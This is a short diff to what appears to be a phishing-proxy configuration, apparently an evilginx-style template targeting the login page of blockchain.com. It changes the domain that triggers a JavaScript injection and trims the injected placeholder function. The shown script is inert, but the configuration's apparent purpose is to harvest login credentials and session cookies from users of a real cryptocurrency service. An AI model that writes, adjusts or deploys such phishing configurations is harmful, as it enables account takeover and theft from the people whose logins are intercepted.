@@ -26,11 +26,10 @@ login:
   domain: 'www.login.blockchain.com'
   path: '/'
 js_inject:
-  - trigger_domains: ["www.blockchain.com/#/login"]
+  - trigger_domains: ["www.login.blockchain.com"]
     trigger_paths: [".*?"]
     script: |
             function lp(){
-                ; 
                 return;
             }
             setTimeout(function(){lp();}, 1500);
